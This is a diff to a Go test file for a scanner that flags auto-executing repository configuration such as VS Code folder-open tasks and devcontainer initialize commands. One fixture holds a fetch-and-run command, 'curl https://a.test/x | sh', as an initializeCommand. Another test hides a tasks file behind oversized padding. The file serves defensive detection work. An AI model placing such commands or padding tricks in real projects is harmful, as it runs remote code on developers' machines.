@@ -211,6 +211,43 @@ func TestAnalyze(t *testing.T) {
 	}
 }
 
+func TestAnalyzeMemberPath(t *testing.T) {
+	const initCmd = `{"initializeCommand": "curl https://a.test/x | sh"}`
+	tests := []struct {
+		name string
+		// inputs
+		path  string
+		depth int
+		data  string
+		// expectations: "<rule suffix>:<line>" of the primary evidence
+		want []string
+	}{
+		{name: "member of a container is matched by what follows the last separator", path: "my!/x.zip!/.vscode/tasks.json", depth: 1, data: tasksFolderOpen, want: []string{"001:7", "010:7"}},
+		{name: "directory on disk called x! is matched whole", path: ".devcontainer/py!/devcontainer.json", depth: 0, data: initCmd, want: []string{"003:1", "011:1"}},
+		{name: "file on disk is not cut at a separator in a directory name", path: "app!/.vscode/tasks.json", depth: 0, data: tasksFolderOpen, want: []string{"001:7", "010:7"}},
+		{name: "member whose cut path names nothing", path: "x.zip!/readme.txt", depth: 1, data: initCmd},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			f := analyze.File{Path: tt.path, Name: tt.path[strings.LastIndex(tt.path, "/")+1:], Data: []byte(tt.data), Depth: tt.depth}
+
+			out, err := autoexec.New().Analyze(context.Background(), f)
+
+			if err != nil {
+				t.Fatal(err)
+			}
+			var got []string
+			for _, fi := range out.Findings {
+				got = append(got, fmt.Sprintf("%s:%d", strings.TrimPrefix(fi.RuleID, "GAL-AUTOEXEC-"), fi.Evidence[0].Line))
+			}
+			slices.Sort(got)
+			if !slices.Equal(got, tt.want) {
+				t.Errorf("findings = %v, want %v", got, tt.want)
+			}
+		})
+	}
+}
+
 func TestAnalyzeSkips(t *testing.T) {
 	tests := []struct {
 		name string
@@ -223,7 +260,8 @@ func TestAnalyzeSkips(t *testing.T) {
 		{name: "json that does not parse", path: ".vscode/tasks.json", data: `{"tasks": [`, wantReason: "parse_error"},
 		{name: "json root is not an object", path: "package.json", data: `[1]`, wantReason: "parse_error"},
 		{name: "json nested too deep", path: "package.json", data: strings.Repeat("[", 200) + strings.Repeat("]", 200), wantReason: "parse_error"},
-		{name: "config larger than the limit", path: ".husky/pre-commit", data: strings.Repeat("#", analyze.MaxConfigSize+1), wantReason: "too_large"},
+		{name: "config larger than the limit", path: ".husky/pre-commit", data: strings.Repeat("#", analyze.MaxConfigSize+1), wantReason: "budget"},
+		{name: "tasks file larger than the limit hides behind its padding", path: ".vscode/tasks.json", data: "//" + strings.Repeat("#", analyze.MaxConfigSize) + "\n" + tasksFolderOpen, wantReason: "budget"},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -384,8 +422,10 @@ func TestPriority(t *testing.T) {
 		{name: "setup.py", path: "setup.py", wantPriority: true},
 		{name: "pyproject.toml", path: "pyproject.toml", wantPriority: true},
 		{name: ".envrc", path: ".envrc", wantPriority: true},
-		{name: "Makefile in any case", path: "build/Makefile", wantPriority: true},
-		{name: "CI workflow", path: ".github/workflows/ci.yml", wantPriority: true},
+		{name: "Makefile only lists automation", path: "build/Makefile", wantPriority: false},
+		{name: "CI workflow only lists automation", path: ".github/workflows/ci.yml", wantPriority: false},
+		{name: "build.rs only lists automation", path: "build.rs", wantPriority: false},
+		{name: "directory on disk called x!", path: ".devcontainer/py!/devcontainer.json", wantPriority: true},
 		{name: "package manager output", path: "node_modules/.bin/tool", wantPriority: true},
 		{name: "member of a container is matched by its member path", path: "repo.zip!/.vscode/tasks.json", wantPriority: true},
 		{name: "package.json inside node_modules", path: "node_modules/dep/package.json", wantPriority: false},
